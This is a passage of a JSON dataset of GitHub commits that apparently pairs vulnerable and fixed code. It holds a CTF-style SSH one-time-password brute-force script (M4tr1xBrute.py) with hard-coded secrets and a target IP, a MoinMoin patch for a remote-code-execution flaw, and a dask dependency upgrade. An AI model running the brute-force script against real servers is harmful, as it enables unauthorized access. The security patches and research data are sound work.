continue\r\n","add":6,"remove":5,"filename":"\/M4tr1xBrute.py","badparts":["        sshprocess = subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r","        processExitCode = sshprocess.poll()\r","        print(\"processExitCode = {}\\n\".format(processExitCode))\r","        sys.exit()\r","        continue"],"goodparts":["        break\r","        continue\r"]},{"diff":"\n     uc = ctt ^ random.choice(secretList)\r\n     hc = (sha256(repr(uc).encode('utf-8')).hexdigest())\r\n     t = hc[22:44]\r\n-    print(\"M4tr1xBrute: getRandom: t = {}\\n\".format(t))\r\n+    # print(\"M4tr1xBrute: getRandom: t = {}\\n\".format(t))\r\n     return t\r\n \r\n while True:\r\n","add":1,"remove":1,"filename":"\/M4tr1xBrute.py","badparts":["    print(\"M4tr1xBrute: getRandom: t = {}\\n\".format(t))\r"],"goodparts":[]},{"diff":"\n         # output = subprocess.getoutput(f'gnome-terminal -x bash -c \"sshpass -p {OTP} ssh {USER}@{RHOST}\"')\r\n         # exec(output)\r\n         print(\"Execute this command: sshpass -p \\'{}\\' ssh architect@{}\\n\\n You have 60 seconds or less to run this command.\".format(OTP,RHOST))\r\n-        sshprocess = subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r\n-        processExitCode = sshprocess.poll()\r\n-        print(\"processExitCode = {}\\n\".format(processExitCode))\r\n-        sys.exit()\r\n+        # sshprocess = subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r\n+        # processExitCode = sshprocess.poll()\r\n+        # print(\"processExitCode = {}\\n\".format(processExitCode))\r\n+        # sys.exit()\r\n+        break\r\n     except Exception as ex:\r\n         print(\"Connection failed with: {}, trying again!\\n\".format(OTP))\r\n         # tb.print_exc()\r\n-        continue\n\\ No newline at end of file\n+        continue\r\n","add":6,"remove":5,"filename":"\/M4tr1xBrute.py","badparts":["        sshprocess = subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r","        processExitCode = sshprocess.poll()\r","        print(\"processExitCode = {}\\n\".format(processExitCode))\r","        sys.exit()\r","        continue"],"goodparts":["        break\r","        continue\r"]}],"source":"\nimport time, subprocess, random, sys, os\r import paramiko \r import ntplib\r from time import ctime\r from hashlib import sha256\r from datetime import datetime, timedelta\r \r sharedSecret1=128939448577488\r sharedSecret2=592988748673453\r sharedSecret3=792513759492579\r USER=\"architect\"\r RHOST=\"10.10.59.109\" \r \"\"\"\r M4tr1xBrute.py: \r Methods: ntplib.NTPClient, \r \r TimeSet:(Input Args) country:str, hours: int,str, mins: int,str, seconds: str,int -> int\r getRandom:(Input Args): N\/A -> str\r \r Description: Derived from GeardoRanger GitHub M4tr1xBrute.py(https:\/\/github.com\/GeardoRanger\/M4tr1xBrute).\r Attempting to establish NTPClient Declarations, and verifying successful ssh hacking NTPClient Request via Paramiko \r and run commands for attempted ssh login according to ssh totp diagrams taken from hacking into BlackCat User for the Architect Login...\r \r \"\"\"\r \r try:\r subprocess.call(\"sudo timedatectl set-timezone UTC\", shell=True)\r print(\"Subprocess TimeZone Change Successful.\")\r client=ntplib.NTPClient() response=client.request(RHOST) print(\"ntplib.NTPClient().request({}): response={}\\n\".format(RHOST, response)) os.system(\"date{}\".format(time.strftime('%m%d%H%M%Y.%S', time.localtime(response.tx_time))))\r except:\r print('Could not sync with time server.')\r sys.exit()\r \r print('\\nTime Sync Completed Successfully.\\nConducting brute-force on OTP\\n')\r \r secretList=[sharedSecret1, sharedSecret2, sharedSecret3]\r \r def TimeSet(country, hours, mins, seconds):\r now=datetime.now() +timedelta(hours=hours, minutes=mins)\r CurrentTime=int(now.strftime(\"%d%H%M\"))\r print(\"M4tr1xBrute: TimeSet: CurrentTime={}\\n\".format(CurrentTime))\r return(CurrentTime)\r \r def getRandom():\r ca=TimeSet('Ukraine', 4, 43, 1)\r cb=TimeSet('Germany', 13, 55, 0)\r cc=TimeSet('England', 9, 19, 1)\r cd=TimeSet('Nigeria', 1, 6, 1)\r ce=TimeSet('Denmark', -5, 18, 1)\r \r timeSetList=[ca, cb, cc, cd, ce]\r randomTimeSet=random.sample(timeSetList, 3)\r \r ctt=randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]\r uc=ctt ^ random.choice(secretList)\r hc=(sha256(repr(uc).encode('utf-8')).hexdigest())\r t=hc[22:44]\r print(\"M4tr1xBrute: getRandom: t={}\\n\".format(t))\r return t\r \r while True:\r OTP=getRandom()\r ssh=paramiko.SSHClient()\r ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\r try:\r ssh.connect(RHOST, username=USER, password=OTP)\r print(\"Success with:{}\\n\".format(OTP))\r print(\"Execute this command: sshpass -p \\'{}\\' ssh architect@{}\\n\\n You have 60 seconds or less to run this command.\".format(OTP,RHOST))\r sshprocess=subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r processExitCode=sshprocess.poll()\r print(\"processExitCode={}\\n\".format(processExitCode))\r sys.exit()\r except Exception as ex:\r print(\"Connection failed with:{}, trying again!\\n\".format(OTP))\r continue ","sourceWithComments":"import time, subprocess, random, sys, os\r\nimport paramiko \r\nimport ntplib\r\n# import traceback as tb\r\nfrom time import ctime\r\nfrom hashlib import sha256\r\nfrom datetime import datetime, timedelta\r\n\r\n#shared secret token for OTP calculation\r\nsharedSecret1 = 128939448577488\r\nsharedSecret2 = 592988748673453\r\nsharedSecret3 = 792513759492579\r\nUSER = \"architect\"\r\nRHOST = \"10.10.59.109\" # LinuxBayServerIPv4Address_HERE!!! CHANGE UPON AttackBox ReInstantiated...!!!\r\n\r\n\"\"\"\r\nM4tr1xBrute.py: \r\nMethods: ntplib.NTPClient, \r\n\r\nTimeSet: (Input Args) country:str, hours: int,str, mins: int,str, seconds: str,int -> int\r\ngetRandom: (Input Args): N\/A -> str\r\n\r\nDescription: Derived from GeardoRanger GitHub M4tr1xBrute.py(https:\/\/github.com\/GeardoRanger\/M4tr1xBrute).\r\nAttempting to establish NTPClient Declarations, and verifying successful ssh hacking NTPClient Request via Paramiko \r\nand run commands for attempted ssh login according to ssh totp diagrams taken from hacking into BlackCat User for the Architect Login...\r\n\r\n\"\"\"\r\n\r\ntry:\r\n    subprocess.call(\"sudo timedatectl set-timezone UTC\", shell=True)\r\n    print(\"Subprocess TimeZone Change Successful.\")\r\n    client = ntplib.NTPClient() #NTPClient Establishment Attempt\r\n    response = client.request(RHOST) #IP of linux-bay server login request on RHOST for response packet Layer 6+ from Transport Layer\r\n    print(\"ntplib.NTPClient().request({}): response = {}\\n\".format(RHOST, response)) #Debug Statement: Informational\r\n    os.system(\"date {}\".format(time.strftime('%m%d%H%M%Y.%S', time.localtime(response.tx_time))))\r\nexcept:\r\n    print('Could not sync with time server.')\r\n    sys.exit()\r\n\r\nprint('\\nTime Sync Completed Successfully.\\nConducting brute-force on OTP\\n')\r\n\r\nsecretList = [sharedSecret1, sharedSecret2, sharedSecret3]\r\n\r\ndef TimeSet(country, hours, mins, seconds):\r\n    now = datetime.now() + timedelta(hours=hours, minutes=mins)\r\n    CurrentTime = int(now.strftime(\"%d%H%M\"))\r\n    print(\"M4tr1xBrute: TimeSet: CurrentTime = {}\\n\".format(CurrentTime) )\r\n    return(CurrentTime)\r\n\r\ndef getRandom():\r\n    ca = TimeSet('Ukraine', 4, 43, 1)\r\n    cb = TimeSet('Germany', 13, 55, 0)\r\n    cc = TimeSet('England', 9, 19, 1)\r\n    cd = TimeSet('Nigeria', 1, 6, 1)\r\n    ce = TimeSet('Denmark', -5, 18, 1)\r\n    \r\n    timeSetList = [ca, cb, cc, cd, ce]\r\n    randomTimeSet = random.sample(timeSetList, 3)\r\n    \r\n    ctt = randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]\r\n    uc = ctt ^ random.choice(secretList)\r\n    hc = (sha256(repr(uc).encode('utf-8')).hexdigest())\r\n    t = hc[22:44]\r\n    print(\"M4tr1xBrute: getRandom: t = {}\\n\".format(t))\r\n    return t\r\n\r\nwhile True:\r\n    OTP = getRandom()\r\n    ssh = paramiko.SSHClient()\r\n    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\r\n    try:\r\n        ssh.connect(RHOST, username=USER, password=OTP)\r\n        print(\"Success with: {}\\n\".format(OTP))\r\n        # OTP = bytes(str(OTP), encoding='utf-8')\r\n        # RHOST = bytes(str(RHOST), encoding='utf-8')\r\n        # output = subprocess.getoutput(f'gnome-terminal -x bash -c \"sshpass -p {OTP} ssh {USER}@{RHOST}\"')\r\n        # exec(output)\r\n        print(\"Execute this command: sshpass -p \\'{}\\' ssh architect@{}\\n\\n You have 60 seconds or less to run this command.\".format(OTP,RHOST))\r\n        sshprocess = subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r\n        processExitCode = sshprocess.poll()\r\n        print(\"processExitCode = {}\\n\".format(processExitCode))\r\n        sys.exit()\r\n    except Exception as ex:\r\n        print(\"Connection failed with: {}, trying again!\\n\".format(OTP))\r\n        # tb.print_exc()\r\n        continue"}},"msg":"Update M4tr1xBrute.py\n\nCommenting out info that doesn't work as remote code brute-force on architect brute-force (\"ssh-totp\"), pythonic code attack...\r\nDefaulting on linux UTC Command initially using subprocess to ensure code execution. Otherwise, debug code and attempted command queries still there as debug code (modded GeardoRanger Code....) \r\nThis may be complete for the last bit, but it IS NOT an officially sanctioned THM Code Write-Up piece due to revealing the SSH-TOTP keys from BlackCat AttackBox Web Server..."}},"https:\/\/github.com\/moinwiki\/moin-1.9":{"d1e5fc7d3708d877353ca64dd4aa7cfd1cde4cb4":{"url":"https:\/\/api.github.com\/repos\/moinwiki\/moin-1.9\/commits\/d1e5fc7d3708d877353ca64dd4aa7cfd1cde4cb4","html_url":"https:\/\/github.com\/moinwiki\/moin-1.9\/commit\/d1e5fc7d3708d877353ca64dd4aa7cfd1cde4cb4","message":"security: fix remote code execution via cache action, CVE-2020-25074\n\nAn attacker with \"write\" permissions can upload specifically made\nmalicious code via the normal wiki attachment upload functionality and\nlater execute it on the server (as the same uid\/gid as the wiki server\nprocess) by using the vulnerable MoinMoin cache action.","sha":"d1e5fc7d3708d877353ca64dd4aa7cfd1cde4cb4","keyword":"remote code execution attack","diff":"diff --git a\/MoinMoin\/action\/cache.py b\/MoinMoin\/action\/cache.py\nindex a38967e8c..f0bb23ee0 100644\n--- a\/MoinMoin\/action\/cache.py\n+++ b\/MoinMoin\/action\/cache.py\n@@ -103,6 +103,19 @@ def key(request, wikiname=None, itemname=None, attachname=None, content=None, se\n     return key\n \n \n+def valid_key(key):\n+    # make sure the key looks like keys generated by key()\n+    if not isinstance(key, unicode):\n+        # key is None (not given in url args) or something unexpected\n+        return False\n+    try:\n+        int(key, 16)  # try to evaluate as hex number\n+    except ValueError:\n+        # was not a hex number\n+        return False\n+    return len(key) == 40  # hmac-sha1 hexdigest == 40 hex chars\n+\n+\n def put(request, key, data,\n         filename=None,\n         content_type=None,\n@@ -234,14 +247,14 @@ def _do_remove(request, key):\n     remove(request, key)\n \n \n-def _do(request, do, key):\n-    if do == 'get':\n-        _do_get(request, key)\n-    elif do == 'remove':\n-        _do_remove(request, key)\n-\n def execute(pagename, request):\n     do = request.values.get('do')\n     key = request.values.get('key')\n-    _do(request, do, key)\n+    valid = valid_key(key)  # validate untrusted input\n+    if valid and do == 'get':\n+        _do_get(request, key)\n+    elif valid and do == 'remove':\n+        _do_remove(request, key)\n+    else:\n+        request.status_code = 404\n \n","files":{"\/MoinMoin\/action\/cache.py":{"changes":[{"diff":"\n     remove(request, key)\n \n \n-def _do(request, do, key):\n-    if do == 'get':\n-        _do_get(request, key)\n-    elif do == 'remove':\n-        _do_remove(request, key)\n-\n def execute(pagename, request):\n     do = request.values.get('do')\n     key = request.values.get('key')\n-    _do(request, do, key)\n+    valid = valid_key(key)  # validate untrusted input\n+    if valid and do == 'get':\n+        _do_get(request, key)\n+    elif valid and do == 'remove':\n+        _do_remove(request, key)\n+    else:\n+        request.status_code = 404\n \n","add":7,"remove":7,"filename":"\/MoinMoin\/action\/cache.py","badparts":["def _do(request, do, key):","    if do == 'get':","        _do_get(request, key)","    elif do == 'remove':","        _do_remove(request, key)","    _do(request, do, key)"],"goodparts":["    valid = valid_key(key)  # validate untrusted input","    if valid and do == 'get':","        _do_get(request, key)","    elif valid and do == 'remove':","        _do_remove(request, key)","    else:","        request.status_code = 404"]},{"diff":"\n     remove(request, key)\n \n \n-def _do(request, do, key):\n-    if do == 'get':\n-        _do_get(request, key)\n-    elif do == 'remove':\n-        _do_remove(request, key)\n-\n def execute(pagename, request):\n     do = request.values.get('do')\n     key = request.values.get('key')\n-    _do(request, do, key)\n+    valid = valid_key(key)  # validate untrusted input\n+    if valid and do == 'get':\n+        _do_get(request, key)\n+    elif valid and do == 'remove':\n+        _do_remove(request, key)\n+    else:\n+        request.status_code = 404\n \n","add":7,"remove":7,"filename":"\/MoinMoin\/action\/cache.py","badparts":["def _do(request, do, key):","    if do == 'get':","        _do_get(request, key)","    elif do == 'remove':","        _do_remove(request, key)","    _do(request, do, key)"],"goodparts":["    valid = valid_key(key)  # validate untrusted input","    if valid and do == 'get':","        _do_get(request, key)","    elif valid and do == 'remove':","        _do_remove(request, key)","    else:","        request.status_code = 404"]}],"source":"\n \"\"\" MoinMoin -Send a raw object from the caching system(and offer utility functions to put data into cache, calculate cache key, etc.). Sample usage ------------ Assume we have a big picture(bigpic) and we want to efficiently show some thumbnail(thumbpic) for it: key=cache.key(..., attachname=bigpic,...) if not cache.exists(..., key): thumbpic=render_thumb(bigpic) cache.put(..., key, thumbpic,...) url=cache.url(..., key) html='<img src=\"%s\">' % url @copyright: 2008 MoinMoin:ThomasWaldmann @license: GNU GPL, see COPYING for details. \"\"\" from datetime import datetime import hmac, hashlib from MoinMoin import log logging=log.getLogger(__name__) from MoinMoin import wikiutil import mimetypes from MoinMoin import config, caching from MoinMoin.util import filesys from MoinMoin.action import AttachFile action_name=__name__.split('.')[-1] cache_arena='sendcache' cache_scope='wiki' do_locking=False def key(request, wikiname=None, itemname=None, attachname=None, content=None, secret=None): \"\"\" Calculate a(hard-to-guess) cache key. Important key properties: * The key must be hard to guess(this is because do=get does no ACL checks, so whoever got the key[e.g. from html rendering of an ACL protected wiki page], will be able to see the cached content. * The key must change if the(original) content changes. This is because ACLs on some item may change and even if somebody was allowed to see some revision of some item, it does not implicate that he is allowed to see any other revision also. There will be no harm if he can see exactly the same content again, but there could be harm if he could access a revision with different content. If content is supplied, we will calculate and return a hMAC of the content. If wikiname, itemname, attachname is given, we don't touch the content(nor do we read it ourselves from the attachment file), but we just calculate a key from the given metadata values and some metadata we get from the filesystem. Hint: if you need multiple cache objects for the same source content(e.g. thumbnails of different sizes for the same image), calculate the key only once and then add some different prefixes to it to get the final cache keys. @param request: the request object @param wikiname: the name of the wiki(if not given, will be read from cfg) @param itemname: the name of the page @param attachname: the filename of the attachment @param content: content data as unicode object(e.g. for page content or parser section content) @param secret: secret for hMAC calculation(default: use secret from cfg) \"\"\" if secret is None: secret=request.cfg.secrets['action\/cache'] if content: hmac_data=content elif itemname is not None and attachname is not None: wikiname=wikiname or request.cfg.interwikiname or request.cfg.siteid fuid=filesys.fuid(AttachFile.getFilename(request, itemname, attachname)) hmac_data=u''.join([wikiname, itemname, attachname, repr(fuid)]) else: raise AssertionError('cache_key called with unsupported parameters') hmac_data=hmac_data.encode('utf-8') key=hmac.new(secret, hmac_data, digestmod=hashlib.sha1).hexdigest() return key def put(request, key, data, filename=None, content_type=None, content_disposition=None, content_length=None, last_modified=None, original=None): \"\"\" Put an object into the cache to send it with cache action later. @param request: the request object @param key: non-guessable key into cache(str) @param data: content data(str or open file-like obj) @param filename: filename for content-disposition header and for autodetecting content_type(unicode, default: None) @param content_type: content-type header value(str, default: autodetect from filename) @param content_disposition: type for content-disposition header(str, default: None) @param content_length: data length for content-length header(int, default: autodetect) @param last_modified: last modified timestamp(int, default: autodetect) @param original: location of original object(default: None) -this is just written to the metadata cache \"as is\" and could be used for cache cleanup, use(wikiname, itemname, attachname or None)) \"\"\" import os.path from MoinMoin.util import timefuncs if filename: filename=os.path.basename(filename) if content_type is None: mt, enc=mimetypes.guess_type(filename) if mt: content_type=mt if content_type is None: content_type='application\/octet-stream' data_cache=caching.CacheEntry(request, cache_arena, key+'.data', cache_scope, do_locking=do_locking) data_cache.update(data) content_length=content_length or data_cache.size() last_modified=last_modified or data_cache.mtime() httpdate_last_modified=timefuncs.formathttpdate(int(last_modified)) headers=[('Content-Type', content_type), ('Last-Modified', httpdate_last_modified), ('Content-Length', content_length), ] if content_disposition and filename: filename=filename.encode(config.charset) headers.append(('Content-Disposition', '%s; filename=\"%s\"' %(content_disposition, filename))) meta_cache=caching.CacheEntry(request, cache_arena, key+'.meta', cache_scope, do_locking=do_locking, use_pickle=True) meta_cache.update({ 'httpdate_last_modified': httpdate_last_modified, 'last_modified': last_modified, 'headers': headers, 'original': original, }) def exists(request, key, strict=False): \"\"\" Check if a cached object for this key exists. @param request: the request object @param key: non-guessable key into cache(str) @param strict: if True, also check the data cache, not only meta(bool, default: False) @return: is object cached?(bool) \"\"\" if strict: data_cache=caching.CacheEntry(request, cache_arena, key+'.data', cache_scope, do_locking=do_locking) data_cached=data_cache.exists() else: data_cached=True meta_cache=caching.CacheEntry(request, cache_arena, key+'.meta', cache_scope, do_locking=do_locking, use_pickle=True) meta_cached=meta_cache.exists() return meta_cached and data_cached def remove(request, key): \"\"\" delete headers\/data cache for key \"\"\" meta_cache=caching.CacheEntry(request, cache_arena, key+'.meta', cache_scope, do_locking=do_locking, use_pickle=True) meta_cache.remove() data_cache=caching.CacheEntry(request, cache_arena, key+'.data', cache_scope, do_locking=do_locking) data_cache.remove() def url(request, key, do='get'): \"\"\" return URL for the object cached for key \"\"\" return request.href(action=action_name, do=do, key=key) def _get_headers(request, key): \"\"\" get last_modified and headers cached for key \"\"\" meta_cache=caching.CacheEntry(request, cache_arena, key+'.meta', cache_scope, do_locking=do_locking, use_pickle=True) meta=meta_cache.content() return meta['last_modified'], meta['headers'] def _get_datafile(request, key): \"\"\" get an open data file for the data cached for key \"\"\" data_cache=caching.CacheEntry(request, cache_arena, key+'.data', cache_scope, do_locking=do_locking) data_cache.open(mode='r') return data_cache def _do_get(request, key): \"\"\" send a complete http response with headers\/data cached for key \"\"\" try: last_modified, headers=_get_headers(request, key) if datetime.utcfromtimestamp(int(last_modified))==request.if_modified_since: request.status_code=304 else: for k, v in headers: request.headers.add(k, v) data_file=_get_datafile(request, key) request.send_file(data_file) except caching.CacheError: request.status_code=404 def _do_remove(request, key): \"\"\" delete headers\/data cache for key \"\"\" remove(request, key) def _do(request, do, key): if do=='get': _do_get(request, key) elif do=='remove': _do_remove(request, key) def execute(pagename, request): do=request.values.get('do') key=request.values.get('key') _do(request, do, key) ","sourceWithComments":"# -*- coding: iso-8859-1 -*-\n\"\"\"\n    MoinMoin - Send a raw object from the caching system (and offer utility\n    functions to put data into cache, calculate cache key, etc.).\n\n    Sample usage\n    ------------\n    Assume we have a big picture (bigpic) and we want to efficiently show some\n    thumbnail (thumbpic) for it:\n\n    # first calculate a (hard to guess) cache key (this key will change if the\n    # original data (bigpic) changes):\n    key = cache.key(..., attachname=bigpic, ...)\n\n    # check if we don't have it in cache yet\n    if not cache.exists(..., key):\n        # if we don't have it in cache, we need to render it - this is an\n        # expensive operation that we want to avoid by caching:\n        thumbpic = render_thumb(bigpic)\n        # put expensive operation's results into cache:\n        cache.put(..., key, thumbpic, ...)\n\n    url = cache.url(..., key)\n    html = '<img src=\"%s\">' % url\n\n    @copyright: 2008 MoinMoin:ThomasWaldmann\n    @license: GNU GPL, see COPYING for details.\n\"\"\"\n\nfrom datetime import datetime\nimport hmac, hashlib\n\nfrom MoinMoin import log\nlogging = log.getLogger(__name__)\n\n# keep both imports below as they are, order is important:\nfrom MoinMoin import wikiutil\nimport mimetypes\n\nfrom MoinMoin import config, caching\nfrom MoinMoin.util import filesys\nfrom MoinMoin.action import AttachFile\n\naction_name = __name__.split('.')[-1]\n\n# Do NOT get this directly from request.values or user would be able to read any cache!\ncache_arena = 'sendcache'  # just using action_name is maybe rather confusing\n\n# We maybe could use page local caching (not 'wiki' global) to have less directory entries.\n# Local is easier to automatically cleanup if an item changes. Global is easier to manually cleanup.\n# Local makes data_dir much larger, harder to backup.\ncache_scope = 'wiki'\n\ndo_locking = False\n\ndef key(request, wikiname=None, itemname=None, attachname=None, content=None, secret=None):\n    \"\"\"\n    Calculate a (hard-to-guess) cache key.\n\n    Important key properties:\n    * The key must be hard to guess (this is because do=get does no ACL checks,\n      so whoever got the key [e.g. from html rendering of an ACL protected wiki\n      page], will be able to see the cached content.\n    * The key must change if the (original) content changes. This is because\n      ACLs on some item may change and even if somebody was allowed to see some\n      revision of some item, it does not implicate that he is allowed to see\n      any other revision also. There will be no harm if he can see exactly the\n      same content again, but there could be harm if he could access a revision\n      with different content.\n\n    If content is supplied, we will calculate and return a hMAC of the content.\n\n    If wikiname, itemname, attachname is given, we don't touch the content (nor do\n    we read it ourselves from the attachment file), but we just calculate a key\n    from the given metadata values and some metadata we get from the filesystem.\n\n    Hint: if you need multiple cache objects for the same source content (e.g.\n          thumbnails of different sizes for the same image), calculate the key\n          only once and then add some different prefixes to it to get the final\n          cache keys.\n\n    @param request: the request object\n    @param wikiname: the name of the wiki (if not given, will be read from cfg)\n    @param itemname: the name of the page\n    @param attachname: the filename of the attachment\n    @param content: content data as unicode object (e.g. for page content or\n                    parser section content)\n    @param secret: secret for hMAC calculation (default: use secret from cfg)\n    \"\"\"\n    if secret is None:\n        secret = request.cfg.secrets['action\/cache']\n    if content:\n        hmac_data = content\n    elif itemname is not None and attachname is not None:\n        wikiname = wikiname or request.cfg.interwikiname or request.cfg.siteid\n        fuid = filesys.fuid(AttachFile.getFilename(request, itemname, attachname))\n        hmac_data = u''.join([wikiname, itemname, attachname, repr(fuid)])\n    else:\n        raise AssertionError('cache_key called with unsupported parameters')\n\n    hmac_data = hmac_data.encode('utf-8')\n    key = hmac.new(secret, hmac_data, digestmod=hashlib.sha1).hexdigest()\n    return key\n\n\ndef put(request, key, data,\n        filename=None,\n        content_type=None,\n        content_disposition=None,\n        content_length=None,\n        last_modified=None,\n        original=None):\n    \"\"\"\n    Put an object into the cache to send it with cache action later.\n\n    @param request: the request object\n    @param key: non-guessable key into cache (str)\n    @param data: content data (str or open file-like obj)\n    @param filename: filename for content-disposition header and for autodetecting\n                     content_type (unicode, default: None)\n    @param content_type: content-type header value (str, default: autodetect from filename)\n    @param content_disposition: type for content-disposition header (str, default: None)\n    @param content_length: data length for content-length header (int, default: autodetect)\n    @param last_modified: last modified timestamp (int, default: autodetect)\n    @param original: location of original object (default: None) - this is just written to\n                     the metadata cache \"as is\" and could be used for cache cleanup,\n                     use (wikiname, itemname, attachname or None))\n    \"\"\"\n    import os.path\n    from MoinMoin.util import timefuncs\n\n    if filename:\n        # make sure we just have a simple filename (without path)\n        filename = os.path.basename(filename)\n\n        if content_type is None:\n            # try autodetect\n            mt, enc = mimetypes.guess_type(filename)\n            if mt:\n                content_type = mt\n\n    if content_type is None:\n        content_type = 'application\/octet-stream'\n\n    data_cache = caching.CacheEntry(request, cache_arena, key+'.data', cache_scope, do_locking=do_locking)\n    data_cache.update(data)\n    content_length = content_length or data_cache.size()\n    last_modified = last_modified or data_cache.mtime()\n\n    httpdate_last_modified = timefuncs.formathttpdate(int(last_modified))\n    headers = [('Content-Type', content_type),\n               ('Last-Modified', httpdate_last_modified),\n               ('Content-Length', content_length),\n              ]\n    if content_disposition and filename:\n        # TODO: fix the encoding here, plain 8 bit is not allowed according to the RFCs\n        # There is no solution that is compatible to IE except stripping non-ascii chars\n        filename = filename.encode(config.charset)\n        headers.append(('Content-Disposition', '%s; filename=\"%s\"' % (content_disposition, filename)))\n\n    meta_cache = caching.CacheEntry(request, cache_arena, key+'.meta', cache_scope, do_locking=do_locking, use_pickle=True)\n    meta_cache.update({\n        'httpdate_last_modified': httpdate_last_modified,\n        'last_modified': last_modified,\n        'headers': headers,\n        'original': original,\n    })\n\n\ndef exists(request, key, strict=False):\n    \"\"\"\n    Check if a cached object for this key exists.\n\n    @param request: the request object\n    @param key: non-guessable key into cache (str)\n    @param strict: if True, also check the data cache, not only meta (bool, default: False)\n    @return: is object cached? (bool)\n    \"\"\"\n    if strict:\n        data_cache = caching.CacheEntry(request, cache_arena, key+'.data', cache_scope, do_locking=do_locking)\n        data_cached = data_cache.exists()\n    else:\n        data_cached = True  # we assume data will be there if meta is there\n\n    meta_cache = caching.CacheEntry(request, cache_arena, key+'.meta', cache_scope, do_locking=do_locking, use_pickle=True)\n    meta_cached = meta_cache.exists()\n\n    return meta_cached and data_cached\n\n\ndef remove(request, key):\n    \"\"\" delete headers\/data cache for key \"\"\"\n    meta_cache = caching.CacheEntry(request, cache_arena, key+'.meta', cache_scope, do_locking=do_locking, use_pickle=True)\n    meta_cache.remove()\n    data_cache = caching.CacheEntry(request, cache_arena, key+'.data', cache_scope, do_locking=do_locking)\n    data_cache.remove()\n\n\ndef url(request, key, do='get'):\n    \"\"\" return URL for the object cached for key \"\"\"\n    return request.href(action=action_name, do=do, key=key)\n\ndef _get_headers(request, key):\n    \"\"\" get last_modified and headers cached for key \"\"\"\n    meta_cache = caching.CacheEntry(request, cache_arena, key+'.meta', cache_scope, do_locking=do_locking, use_pickle=True)\n    meta = meta_cache.content()\n    return meta['last_modified'], meta['headers']\n\n\ndef _get_datafile(request, key):\n    \"\"\" get an open data file for the data cached for key \"\"\"\n    data_cache = caching.CacheEntry(request, cache_arena, key+'.data', cache_scope, do_locking=do_locking)\n    data_cache.open(mode='r')\n    return data_cache\n\n\ndef _do_get(request, key):\n    \"\"\" send a complete http response with headers\/data cached for key \"\"\"\n    try:\n        last_modified, headers = _get_headers(request, key)\n        if datetime.utcfromtimestamp(int(last_modified)) == request.if_modified_since:\n            request.status_code = 304\n        else:\n            for k, v in headers:\n                request.headers.add(k, v)\n            data_file = _get_datafile(request, key)\n            request.send_file(data_file)\n    except caching.CacheError:\n        request.status_code = 404\n\n\ndef _do_remove(request, key):\n    \"\"\" delete headers\/data cache for key \"\"\"\n    remove(request, key)\n\n\ndef _do(request, do, key):\n    if do == 'get':\n        _do_get(request, key)\n    elif do == 'remove':\n        _do_remove(request, key)\n\ndef execute(pagename, request):\n    do = request.values.get('do')\n    key = request.values.get('key')\n    _do(request, do, key)\n\n"}},"msg":"security: fix remote code execution via cache action, CVE-2020-25074\n\nAn attacker with \"write\" permissions can upload specifically made\nmalicious code via the normal wiki attachment upload functionality and\nlater execute it on the server (as the same uid\/gid as the wiki server\nprocess) by using the vulnerable MoinMoin cache action."}},"https:\/\/github.com\/jsharpna\/autogluon_eda":{"9405c070046d06757b12b41c5d6ae51339531d6f":{"url":"https:\/\/api.github.com\/repos\/jsharpna\/autogluon_eda\/commits\/9405c070046d06757b12b41c5d6ae51339531d6f","html_url":"https:\/\/github.com\/jsharpna\/autogluon_eda\/commit\/9405c070046d06757b12b41c5d6ae51339531d6f","message":"[security] SafetyVulnerabilityAdvisory vulnerability_id='42345', advisory='An issue was discovered in Dask (aka python-dask) through 2021.09.1. Single machine Dask clusters started with dask.distributed.LocalCluster or dask.distributed.Client (which defaults to using LocalCluster) would mistakenly configure their respective Dask workers to listen on external interfaces (typically with a randomly selected high port) rather than only on localhost. A Dask cluster created using this method (when running on a machine that has an applicable port exposed) could be used by a sophisticated attacker to achieve remote code execution. (#1385)","sha":"9405c070046d06757b12b41c5d6ae51339531d6f","keyword":"remote code execution attack","diff":"diff --git a\/core\/setup.py b\/core\/setup.py\nindex 094eb395..43a1a847 100644\n--- a\/core\/setup.py\n+++ b\/core\/setup.py\n@@ -31,8 +31,8 @@\n     'requests',\n     'matplotlib',\n     'paramiko>=2.4',\n-    'dask>=2.6.0',\n-    'distributed>=2.6.0',\n+    'dask>=2021.09.1',\n+    'distributed>=2021.09.1',\n     'boto3',\n     'autograd>=1.3',\n     'dill>=0.3.3,<1.0',\n","files":{"\/core\/setup.py":{"changes":[{"diff":"\n     'requests',\n     'matplotlib',\n     'paramiko>=2.4',\n-    'dask>=2.6.0',\n-    'distributed>=2.6.0',\n+    'dask>=2021.09.1',\n+    'distributed>=2021.09.1',\n     'boto3',\n     'autograd>=1.3',\n     'dill>=0.3.3,<1.0',\n","add":2,"remove":2,"filename":"\/core\/setup.py","badparts":["    'dask>=2.6.0',","    'distributed>=2.6.0',"],"goodparts":["    'dask>=2021.09.1',","    'distributed>=2021.09.1',"]},{"diff":"\n     'requests',\n     'matplotlib',\n     'paramiko>=2.4',\n-    'dask>=2.6.0',\n-    'distributed>=2.6.0',\n+    'dask>=2021.09.1',\n+    'distributed>=2021.09.1',\n     'boto3',\n     'autograd>=1.3',\n     'dill>=0.3.3,<1.0',\n","add":2,"remove":2,"filename":"\/core\/setup.py","badparts":["    'dask>=2.6.0',","    'distributed>=2.6.0',"],"goodparts":["    'dask>=2021.09.1',","    'distributed>=2021.09.1',"]}],"source":"\n import os from setuptools import setup import importlib.util filepath=os.path.abspath(os.path.dirname(__file__)) filepath_import=os.path.join(filepath, '..', 'core', 'src', 'autogluon', 'core', '_setup_utils.py') spec=importlib.util.spec_from_file_location(\"ag_min_dependencies\", filepath_import) ag=importlib.util.module_from_spec(spec) spec.loader.exec_module(ag) version=ag.load_version_file() version=ag.update_version(version, use_file_if_exists=False, create_file=True) submodule='core' install_requires=[ 'numpy', 